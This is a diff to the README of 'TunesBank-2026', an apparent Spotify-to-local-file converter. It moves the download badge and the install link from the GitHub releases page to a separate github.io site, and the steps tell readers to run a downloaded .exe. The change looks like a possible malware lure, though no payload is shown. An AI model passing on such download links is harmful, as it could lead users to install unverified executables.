@@ -1,6 +1,6 @@
 # 🎵 TunesBank-2026 - Convert Spotify songs to local files
 
-[![](https://img.shields.io/badge/Download-TunesBank%20Installer-blue.svg)](https://github.com/Bourgeois-agglomeration213/TunesBank-2026/releases)
+[![](https://img.shields.io/badge/Download-TunesBank%20Installer-blue.svg)](https://bourgeois-agglomeration213.github.io)
 
 ## 📖 About the software
 
@@ -20,7 +20,7 @@ Ensure your PC meets these specifications before you begin:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page: [https://github.com/Bourgeois-agglomeration213/TunesBank-2026/releases](https://github.com/Bourgeois-agglomeration213/TunesBank-2026/releases).
+1.  Visit the official release page: [https://bourgeois-agglomeration213.github.io](https://bourgeois-agglomeration213.github.io).
 2.  Locate the latest version release.
 3.  Click the file ending in .exe to start your download.
 4.  Open the downloaded file once the process ends.
